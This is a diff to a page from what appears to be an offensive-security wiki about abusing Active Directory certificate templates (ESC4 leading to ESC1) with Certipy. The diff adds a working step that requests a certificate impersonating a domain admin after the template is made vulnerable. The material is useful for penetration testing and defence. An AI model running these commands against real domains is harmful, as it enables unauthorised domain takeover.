@@ -51,10 +51,15 @@ In order to obtain an abusable template, some attributes and parameters need to 
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries ([how to enumerate](broken-reference/)), and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.
 
 ```bash
-# 1. Save the old configuration
+# 1. Save the old configuration, edit the template and make it vulnerable
 certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -save-old
 
-# 2. After the attack, restore the original configuration
+# Warning: running the coommand twice will override the backup file, make sure to keep a seconde backup of the old configuration somwhere.
+
+# 2. Request a template certificate with a custom SAN
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+
+# 3. After the attack, restore the original configuration
 certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -configuration 'templateName.json'
 ```
 
